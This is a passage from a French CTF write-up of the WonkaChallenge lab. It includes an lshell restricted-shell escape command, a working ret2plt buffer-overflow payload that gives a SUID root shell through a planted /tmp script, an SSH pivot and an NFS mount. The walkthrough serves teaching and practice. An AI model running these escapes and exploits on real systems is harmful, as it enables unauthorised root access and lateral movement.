3e:20:13:a5:09:49 * ens18 172.16.69.65 0x1 0x2 96:2e:20:a6:a0:f3 * ens18 Une nouvelle IP a été trouvé : 172.16.69.65. Il n’est pas possible de ré-utiliser les identifiants de Veruca sur cette IP. Pour vérifier les différents services sur ces machines, il est nécessaire de faire un scan de port complet. X.1.a. 172.16.69.65 Pour des soucis de rapidité, j’ai préféré utiliser masscan plutôt que nmap. (KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.65 Discovered open port 22/tcp on 172.16.69.65 Un service sur le port 22 est disponible, le SSH en question. Il n’y a pas d’autres services. X.1.b. 172.16.69.78 (SRV01-WEB-WW3) La machine SRV01-WEB-WW3 a un service de plus exposé : (KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.78 Discovered open port 80/tcp on 172.16.69.78 Discovered open port 22/tcp on 172.16.69.78 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:11:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"X.2. Connexion SSH au serveur distant Etant donné qu’un service web est exposé et qu’un accès ssh est disponible, il est possible de lister directement le contenu de /var/www/html : (SRV01-WEB-WW3) ➜ ls /var/www/html index.html index.nginx-debian.html À première vue, le serveur utilisé est un nginx. Il est possible de vérifier la configuration du serveur et des différents sites dans le dossier /etc/nginx/sites-available : (SRV01-WEB-WW3) ➜ ls /etc/nginx/sites-available default dev3.challenge.akerva.com (SRV01-WEB-WW3) ➜ cat /etc/nginx/sites-available/dev3.challenge.akerva.com server { server_name dev3.challenge.akerva.com; listen 80; listen [::]:80; root /usr/share/nginx/dev3.challenge.akerva.com; index index.html index.php; autoindex off; add_header X-Frame-Options SAMEORIGIN; add_header X-Content-Type-Options nosniff; add_header X-XSS-Protection \"1; mode=block\"; location / { if (-f /usr/share/nginx/dev3.challenge.akerva.com/error/index.html){ return 503; } } location ~ /\\.{ deny all; access_log off; log_not_found off; } #Error pages error_page 503 /index.html; location = /index.html { root /usr/share/nginx/dev3.challenge.akerva.com/error/; internal; } location ~ ^/.*\\.php { try_files $uri =503; include fastcgi_params; fastcgi_pass unix:/run/php/php7.3-fpm.sock; fastcgi_split_path_info ^/(.+\\.php)(/.*)$; fastcgi_index index.php; fastcgi_param HTTPS on; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_intercept_errors on; } } Plusieurs informations intéressantes se trouvent dans ce fichier, dont la racine du site web : /usr/share/nginx/dev3.challenge.akerva.com : (SRV01-WEB-WW3) ➜ ls -la /usr/share/nginx/dev3.challenge.akerva.com total 24 drwxr-xr-x 6 root root 4096 juil. 5 11:08 . drwxr-xr-x 5 root root 4096 juin 21 18:42 .. drwxr-xr-x 2 www-data www-data 4096 juin 26 17:01 error drwxr-xr-x 2 www-data www-data 4096 juil. 4 10:52 golden_tickets drwxr-xr-x 2 www-data www-data 4096 juin 26 18:02 keys drwxr-xr-x 2 www-data www-data 4096 juil. 5 11:08 scripts (SRV01-WEB-WW3) ➜ ls -la /usr/share/nginx/dev3.challenge.akerva.com/keys total 12 drwxr-xr-x 2 www-data www-data 4096 juin 26 18:02 . drwxr-xr-x 6 root root 4096 juil. 5 11:08 .. -rw-r----- 1 www-data www-data 1679 juin 26 18:02 id_rsa Une clé privée SSH est disponible dans l’arborescence du frontend. La connexion à l’autre machine doit être possible avec cette clé. Il ne manque que l’utilisateur associé. La clé privée est disponible ici. La plateforme de challenge du WonkaChall propose un hint par épreuve. Pour cette étape, le hint est le nom de l’utilisateur, à savoir violet. Connaissant le nom de l’utilisateur et la clé associée, il est possible de se connecter au serveur distant : ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:11:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"X.3. Escaping the restricted shell Dans la réalité, le shell restreint n’est pas apparu directement. En utilisant zsh, j’ai rencontré un soucis (dont j’ignore totalement la cause). Par contre, cela m’a permis d’accéder à l’erreur suivante : (KaliVM) ➜ ssh violet@172.16.69.65 -i /home/maki/Documents/wonkachall2019/step10/id_rsa Linux SRV02-BACKUP 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. You have new mail. Last login: Fri Jul 19 11:36:53 2019 from 10.8.0.14 Traceback (most recent call last): File \"/usr/bin/lshell\", line 52, in \u003cmodule\u003e main() File \"/usr/bin/lshell\", line 38, in main userconf = CheckConfig(args).returnconf() File \"/usr/local/lib/python2.7/dist-packages/lshell/checkconfig.py\", line 69, in _init_ self.get_global() File \"/usr/local/lib/python2.7/dist-packages/lshell/checkconfig.py\", line 145, in get_global self.config.read(self.conf['configfile']) File \"/usr/local/lib/python2.7/dist-packages/backports/configparser/_init_.py\", line 697, in read self._read(fp, filename) File \"/usr/local/lib/python2.7/dist-packages/backports/configparser/_init_.py\", line 1027, in _read for lineno, line in enumerate(fp, start=1): File \"/usr/lib/python2.7/encodings/ascii.py\", line 26, in decode return codecs.ascii_decode(input, self.errors)[0] UnicodeDecodeError: 'ascii' codec can't decode byte 0xc2 in position 2854: ordinal not in range(128) Connection to 172.16.69.65 closed. Grâce à l’erreur python trouvée, très explicite, il me fût facile de tomber sur le GitHub de lshell. Pour s’évader de ce shell restreint, le plus simple reste d’inspecter les différentes issues de sécurité du dépôt. Actuellement, il n’y a qu’une issue de securité active : https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754 L’utilisateur omega8cc mentionne un moyen de s’échapper fonctionnel : (SRV02-BACKUP lshell) ➜ echo FREEDOM! \u0026\u0026 cd () bash \u0026\u0026 cd Le flag est situé dans le home de violet : (SRV02-BACKUP as violet) ➜ cat /etc/passwd|grep violet violet❌1000:1000:violet,,,:/home/violet:/usr/bin/lshell (SRV02-BACKUP as violet) ➜ ls /home/violet flag-10.txt (SRV02-BACKUP as violet) ➜ cat /home/violet/flag-10.txt d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:11:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"X.4. Flag d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:11:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Resources ghantoos, lshell - SECURITY ISSUE: Inappropriate parsing of command syntax, GitHub : https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:11:6","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XI. Step 11 - Free flag Free for all \\o/ ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:12:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Remarquer qu’il existe des fichiers world readable dans le /home du système ; Lire la clé privée de l’utilisateur Georgina ; Se connecter avec cette clé privée et accéder au home de Georgina. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:12:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XI.1. Trouver la clé privé Étant connecté sur un système avec un utilisateur “standard”, naturellement je regarde s’il m’est possible d’accéder aux home des autres utilisateurs du système. C’est comme cela que j’ai trouvé une clé privée dans le home de l’utilisateur Georgina : La clé privée est disponible ici. Il ne reste plus qu’à se connecter au même serveur en tant que Georgina : (KaliVM) ➜ chmod 0600 ~/Documents/id_rsa_georgina (KaliVM) ➜ ssh georgina@172.16.69.65 -i ~/Documents/id_rsa_georgina [...] (SRV02-BACKUP as Georgina) ➜ cat flag-11.txt 5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:12:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XI.2. Flag 5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:12:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XII. Step 12 - Return to PLankTon Pwn2Own ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:13:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Utiliser LinEnum afin de trouver exportVIP un binaire SUID et SGID ; Trouver l’overflow de manière empirique ; Déterminer le padding (de 296 octets) nécessaire à la réécriture de RSP ; Regarder la plt du binaire et les protections mises en place, en déduire que l’exploitation est un ret2plt ; Récupérer l’adresse de la fonction system disponible dans la plt ; Trouver un gadget pop rdi; ret dans le binaire nécessaire pour le placement des arguments ; Trouver l’adresse d’une chaîne de caractère dans le binaire, par exemple GNU ; Faire un script exécutant un /bin/bash -p, l’appeler GNU et le rajouter dans le PATH ; Exploiter le ret2plt en appelant la fonction system en plaçant GNU en paramètre : /opt/exportVIP \u003c \u003c(python -c 'from pwn import *; print \"a\"*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)';cat) ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:13:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XII.1. Post exploitation Etant connecté en tant que Georgina ou Violet, le but est d’élever ses privilèges et de récupérer un accès root au serveur. Pour cela, il existe de nombreux scripts d’énumération pour de la post-exploitation sur GitHub. Personnellement, je trouve que LinEnum est le plus pertinent. Ci-dessous les résultats importants remontés par LinEnum : (SRV02-BACKUP as Georgina) ➜ ./LinEnum.sh -s -r report -e /dev/shm -t [...] [-] SUID files: -rwsr-xr-x 1 root root 10232 mars 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 440728 mars 1 17:19 /usr/lib/openssh/ssh-keysign -rwsr-xr-- 1 root messagebus 42992 juin 9 23:42 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 59680 mai 17 2017 /usr/bin/passwd -rwsr-xr-x 1 root root 50040 mai 17 2017 /usr/bin/chfn -rwsr-xr-x 1 root root 75792 mai 17 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 40504 mai 17 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 40312 mai 17 2017 /usr/bin/newgrp -rwsr-xr-x 1 root root 1019656 mai 28 22:13 /usr/sbin/exim4 -rwsr-xr-x 1 root root 40536 mai 17 2017 /bin/su -rwsr-xr-x 1 root root 44304 mars 7 2018 /bin/mount -rwsr-xr-x 1 root root 31720 mars 7 2018 /bin/umount -rwsr-xr-x 1 root root 61240 nov. 10 2016 /bin/ping -rwsr-s---+ 1 root root 14392 juil. 8 11:03 /opt/exportVIP -rwsr-xr-x 1 root root 110760 mars 20 2017 /sbin/mount.nfs [-] SGID files: -rwxr-sr-x 1 root mail 19008 janv. 17 2017 /usr/bin/dotlockfile -rwxr-sr-x 1 root ssh 358624 mars 1 17:19 /usr/bin/ssh-agent -rwxr-sr-x 1 root crontab 40264 oct. 7 2017 /usr/bin/crontab -rwxr-sr-x 1 root tty 27448 mars 7 2018 /usr/bin/wall -rwxr-sr-x 1 root shadow 71856 mai 17 2017 /usr/bin/chage -rwxr-sr-x 1 root shadow 22808 mai 17 2017 /usr/bin/expiry -rwxr-sr-x 1 root tty 14768 avril 12 2017 /usr/bin/bsd-write -rwxr-sr-x 1 root mail 10952 déc. 25 2016 /usr/bin/dotlock.mailutils -rwsr-s---+ 1 root root 14392 juil. 8 11:03 /opt/exportVIP -rwxr-sr-x 1 root shadow 35592 mai 27 2017 /sbin/unix_chkpwd [...] Un seul de ces binaires n’est pas un programme par défaut : /opt/exportVIP. Si il est possible d’exécuter des commandes avec ce binaire, alors il sera possible d’exécuter des commandes en tant qu’utilisateur root. Il est préférable de réaliser l’analyse en local, dans un environnement maîtrisé : (KaliVM) ➜ scp -i ~/Documents/id_rsa_georgina georgina@172.16.69.65:/opt/exportVIP . Le binaire est disponible ici. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:13:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XII.2. Informations sur le binaire C’est un binaire 64 bits, strippé et linké dynamiquement : (KaliVM) ➜ file ./exportVIP exportVIP: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=46f5d9039533417cd40afbe9f9a7dbdf3726b897, stripped Un stripped binary est un binaire sans les symboles de debug. Il est plus léger qu’un binaire non strippé. L’absence de ces symboles de debug complexifie le reverse du programme. Quant aux protections en place sur exportVIP, il n’y en a pas beaucoup : (KaliVM) ➜ checksec --file ./exportVIP RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH No Symbols No 0 4 ./exportVIP Merci à Tomtombinary, pour le schéma ci-dessous, résumant les types d’exploitation possibles en fonction des protections activées. Cependant , veuillez noter que le schéma n’est PAS complet. Dans le cadre de l’exploitation de exportVIP, le bit NX est activé, et sans doute l’ASLR . Enfin l’outil readelf permet d’obtenir des informations complémentaires comme les fonctions présentes dans la plt, le contenu de la got et bien d’autres choses. (KaliVM) ➜ readelf -a ./exportVIP [...] Section de réadressage '.rela.plt' à l\\'adresse de décalage 0x528 contient 8 entrées: Décalage Info Type Val.-symboles Noms-symb.+ Addenda 000000404018 000100000007 R_X86_64_JUMP_SLO 0000000000000000 strncpy@GLIBC_2.2.5 + 0 000000404020 000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0 000000404028 000300000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0 000000404030 000400000007 R_X86_64_JUMP_SLO 0000000000000000 system@GLIBC_2.2.5 + 0 000000404038 000500000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0 000000404040 000600000007 R_X86_64_JUMP_SLO 0000000000000000 snprintf@GLIBC_2.2.5 + 0 000000404048 000700000007 R_X86_64_JUMP_SLO 0000000000000000 memset@GLIBC_2.2.5 + 0 000000404050 000a00000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0 [...] La fonction system étant présente dans la plt du binaire, cela va nous faciliter l’exploitation. En effet, si l’on se réfère au schéma de la figure 42, il faudrait leak une adresse de la libc, récupérer l’adresse de base de la libc et appeler la fonction system. Geluchat a fait un bon article sur son blog à ce sujet. Dans le cas du binaire exportVIP, la fonction system est déjà présente dans le programme. Il suffit donc de l’appeler en plaçant l’argument voulu. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:13:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XII.3. Explication de l’exploitation L’objectif est d’appeler la fonction system avec un paramètre contrôlé. Pour cela, il est impératif de trouver un buffer overflow pour pouvoir réécrire RIP pour rediriger le flux d’exécution sur l’adresse de system, si on veut résumer. Pour trouver le buffer overflow, il existe deux écoles : reverse en statique ou à grand coup de tests dynamiques (il est possible de mixer les deux). Pour rappel, le binaire ne contient pas les symboles de debug. Lorsque le signal système SIGSEGV est levé, cela signifie que le programme concerné à segmentation fault. En d’autres termes, une fonction du programme a tenté d’accéder à une zone mémoire non existante ou non autorisée. Dans le cadre d’une exploitation d’un buffer overflow, c’est une bonne chose, car RIP a bien été réécrit. Il va falloir trouver le bon padding pour réécrire RIP. Dans la convention de l’assembleur 64 bits, le premier argument d’une fonction se place dans le registre rdi. Afin d’exécuter la charge utile, il est possible de trouver une chaîne de caractère dans le programme exportVIP, comme “GNU” par exemple. Cette chaîne est présente dans tous les ELF (binaire linux). Lorsque la chaîne a été choisie, il faut trouver son adresse dans le binaire ; exportVIP n’étant pas soumis à la PIE, cette adresse ne changera pas. Enfin, il ne reste qu’à créer un script s’appelant comme la chaîne choisi et à l’ajouter dans le PATH. En résumé, l’objectif est de faire : system(\"GNU\"); Pour placer “GNU” dans rdi, il faut trouver un gadget. Un gadget est une suite d’instruction assembleur présente dans le binaire. Il faut donc trouver un gadget pop rdi; ret. Pour rappel, la stack fonctionne comme ceci : Au final, le payload d’exploitation final devra ressembler à : padding + gadget + adresse de GNU + adresse de system ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:13:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XII.4. Exploitation XII.4.a. Déterminer le padding Lorsque l’on cherche le padding d’un buffer overflow, la librairie pwntool peut être utile, car elle nous permet de générer un pattern. Ce pattern d’une taille arbitraire mais suffisamment grande servira à faire segfault le programme. La valeur contenu dans RSP servira à déterminer la taille du padding : from pwn import * # generate pattern cyclic(400) # find offset find_cyclic('yaac') 296 Le padding pour contrôler RIP est de 296 octets. Note : L’instruction ret étant un alias pour pop rip, il faut donc observer le contenu du stack pointer, soit rsp. XII.4.b. Récupérer l’adresse de system Pour trouver l’adresse de system, il n’est pas nécessaire de sortir l’artillerie lourde (IDA Pro, Ghidra…). Un simple objdump fait l’affaire : (KaliVM) ➜ objdump -D ./exportVIP | grep system 0000000000401060 \u003csystem@plt\u003e: 40133d: e8 1e fd ff ff callq 401060 \u003csystem@plt\u003e Le call de system dans le binaire est à l’adresse 0x40133d. XII.4.c. Trouver un bon gadget Lister les gadgets d’un binaire peut se faire avec l’outil ROPGadget. Il permet de trouver les différents gadget et leur adresse. Pour rappel on cherche un pop rdi; ret : (KaliVM) ➜ ROPgadget.py --binary ../exportVIP [...] 0x000000000040145b : pop rdi ; ret [...] L’adresse du gadget est donc 0x000000000040145b XII.4.d. Trouver l’adresse de la chaîne GNU La dernière pièce du puzzle est l’adresse de la chaîne GNU dans exportVIP. Toujours avec objdump, il est possible de récupérer l’adresse de cette chaîne : (KaliVM) ➜ objdump -s /home/maki/Documents/wonkachall2019/step8/exportVIP L’adresse de GNU n’est pas vraiment 0x4002d0, on peut voir que ce n’est pas aligné. Il suffit d’enlever 4 octets : \u003e\u003e\u003e hex(0x4002d4-0x4) '0x4002d0' L’adresse de GNU est : 0x4002d0 XII.4.e. Ajout d’un binaire GNU dans le PATH Le binaire “GNU” va contenir un simple bash -p, l’argument permet de garder les droits de l’utilisateur pendant l’exécution. #!/bin/bash -p /bin/bash -p Ce script sera stocké dans le dossier /tmp : (SRV02-BACKUP as Georgina) ➜ vim /tmp/GNU # Collage du script ci-dessus (SRV02-BACKUP as Georgina) ➜ chmod 777 /tmp/GNU (SRV02-BACKUP as Georgina) ➜ export PATH=$PATH:/tmp ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:13:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XII.5. Exécution Tous les paramètres sont maintenant disponibles : le padding, l’adresse du gadget, l’adresse de GNU et l’adresse de système. Il ne reste plus qu’à exploiter. (SRV02-BACKUP as Georgina) ➜ /opt/exportVIP \u003c \u003c(python -c 'from pwn import *; print \"a\"*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)';cat) Note : La librairie pwntool est disponible sur le serveur distant. C’est plutôt rare, mais c’est arrangeant. Le flag de cette étape se trouve dans le dossier /root. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:13:6","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XII.6. Flag 6f424a5e3b001ee6a832581680169e2f687d8d6e493bdb4b26d518798f7b3c30 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:13:7","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Resources Rémi Martin, Exploitation – ByPass ASLR+NX with ret2plt, shoxx-website : http://shoxx-website.com/2016/05/exploitation-bypass-aslrnx-with-ret2plt.html Geluchat, Petit Manuel du ROP à l’usage des débutants, dailysecurity : https://www.dailysecurity.fr/return_oriented_programming/ ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:13:8","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XIII. Step 13 - The final countdown SHA256(WillyWonka’s chief name) ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:14:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Trouver la machine qui manque sur le schéma réseau avec arp : cat /proc/net/arp ; Mettre en place un proxychains avec la machine précédente en tant que pivot ; Faire un scan de port avec nmap sur la nouvelle cible, voir le nfs sur le port 2049 ; Monter le nfs distant sur la machine de pivot ; Copier les fichiers du partage réseau ; Analyser les métadonnées avec exiftool et trouver que Grandma Josephine est le chef de Willy Wonka. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:14:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XIII.1. Post exploitation Le schéma trouvé sur le serveur SRV01-INTRANET est incomplet. En effet, la machine SRV03-FILER est tagguée en tant que “TODO”. L’épreuve finale doit consister en l’accès à cette dernière machine. Avant de passer à la suite, il convient de se connecter en root au serveur SRV02-BACKUP avec un réel accès SSH. La clé privée est disponible ici. L’objectif est de trouver le chef de Willy Wonka. Comme pour la première étape de la dixième épreuve (cf. X.1. Reconnaissance), il est intéressant de vérifier le contenu du cache arp : (SRV02-BACKUP as root) ➜ cat /proc/net/arp IP address HW type Flags HW address Mask Device 172.16.69.23 0x1 0x2 ce:d3:94:6c:38:3f * ens18 172.16.69.78 0x1 0x2 7a:0a:61:1a:36:65 * ens18 172.16.69.254 0x1 0x2 3e:20:13:a5:09:49 * ens18 Une nouvelle IP est apparut : 172.16.69.23. Sûrement la machine nommée SRV03-FILER. Celle-ci n’a pas l’air accessible directement malgré les routes en place. Cependant, ayant un accès SSH à la machine SRV02-BACKUP, il est possible de faire un pivot. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:14:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XIII.2. Mise en place du pivot Pour faire un pivot, il existe au moins deux outils pertinents : proxychains et sshuttle. Dans les deux cas, il est nécessaire de faire suivre un port de la machine pivot (SRV02-BACKUP) et la machine de l’attaquant (KaliVM). Pour cette configuration, l’architecture présentée dans l’introduction a été abandonnée. Le VPN du WonkaChall est directement dans la KaliVM. (KaliVM) ➜ ssh -D 1080 root@172.16.69.65 -i ./id_rsa_root La configuration de proxychains : [...] # Quiet mode (no output from library) quiet_mode [...] socks4 127.0.0.1 1080 Le pivot est désormais mis en place. Il est possible pour la KaliVM d’accéder à SRV03-FILER. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:14:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XIII.3. Scan de port Le scan de port devenant une coutume lors de la découverte d’un nouvel hôte, celui-ci ne va pas échapper à la règle : (KaliVM) ➜ proxychains nmap -F -sT -Pn -T4 -vvv 172.16.69.23 ProxyChains-3.1 (http://proxychains.sf.net) Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-22 01:16 CEST [...] PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 111/tcp open rpcbind syn-ack 2049/tcp open nfs syn-ack En considérant les trois ports ouverts, l’hypothèse la plus probable est l’accès au Network File System (nfs) sur le port 2049/tcp. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:14:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XIII.4. Montage du volume NFS La tentative de montage en passant par proxychains est un échec. La solution la plus simple est de monter ce volume sur le serveur SRV02-BACKUP : (SRV02-BACKUP as root) ➜ mkdir /tmp/a (SRV02-BACKUP as root) ➜ mount -t nfs 172.16.69.23:/ /tmp/a (SRV02-BACKUP as root) ➜ ls /tmp/a DATA Le volume est monté avec succès. Il contient beaucoup d’images, un docx et un pdf : (SRV02-BACKUP as root) ➜ ls -laR /tmp/a/DATA [...] ./pictures: total 11652 drwxr-x--x 2 nobody nogroup 4096 juil. 4 10:51 . drwxr-xr-x 11 root root 4096 juin 24 17:43 .. -rw-r--r-- 1 nobody nogroup 131823 juil. 4 10:50 ascenseurRedTeam.png -rw-r--r-- 1 nobody nogroup 1901579 juil. 4 10:50 cinemaRedTeam.png -rw-r--r-- 1 nobody nogroup 196371 juil. 4 10:50 croissantageSaif.png -rw-r--r-- 1 nobody nogroup 130839 juil. 4 10:50 demenagement.png -rw-r--r-- 1 nobody nogroup 153995 juil. 4 10:50 glace.png -rw-r--r-- 1 nobody nogroup 37247 juil. 4 10:50 kenkenken.png -rw-r--r-- 1 nobody nogroup 138224 juil. 4 10:50 keskiamaintenant.png -rw-r--r-- 1 nobody nogroup 190794 juil. 4 10:50 miam.png -rw-r--r-- 1 nobody nogroup 116749 juil. 4 10:50 newyork.png -rw-r--r-- 1 nobody nogroup 86819 juil. 4 10:50 notredame.png -rw-r--r-- 1 nobody nogroup 965251 juil. 4 10:50 onPartEnRestitution.jpg -rw-r--r-- 1 nobody nogroup 2196730 juil. 4 10:50 onVeutDuPain.png -rw-r--r-- 1 nobody nogroup 1039727 juil. 4 10:50 plage.png -rw-r--r-- 1 nobody nogroup 104879 juil. 4 10:50 redabogoss.png -rw-r--r-- 1 nobody nogroup 137275 juil. 4 10:50 redaSport.png -rw-r--r-- 1 nobody nogroup 2043318 juil. 4 10:50 rootagedADsurDouchette.png -rw-r--r-- 1 nobody nogroup 182331 juil. 4 10:50 rootagedemeres.png -rw-r--r-- 1 nobody nogroup 1968672 juil. 4 10:50 soireeAvantPentest.png -rw-r--r-- 1 nobody nogroup 69753 juil. 4 10:50 soireepicol.png -rw-r--r-- 1 nobody nogroup 93357 juil. 4 10:50 toiletteAmehdi.png [...] ./VIP: total 408 drwxr-x--x 2 nobody nogroup 4096 juil. 5 16:59 . drwxr-xr-x 11 root root 4096 juin 24 17:43 .. -rw-r--r-- 1 nobody nogroup 88168 juil. 5 16:58 flag_lol.jpg -rw-r--r-- 1 nobody nogroup 30234 juil. 3 19:15 INVOICE.docx -rw-r--r-- 1 nobody nogroup 127983 juil. 3 19:15 INVOICE.pdf -rw-r--r-- 1 nobody nogroup 152189 juil. 5 16:58 whiteboard.jpg L’identité du chef de Willy Wonka doit se trouver dans les métadonnées d’un des fichiers du volume. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:14:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XIII.5. Copie des fichiers du volume Encore une fois, la solution la plus simple et la 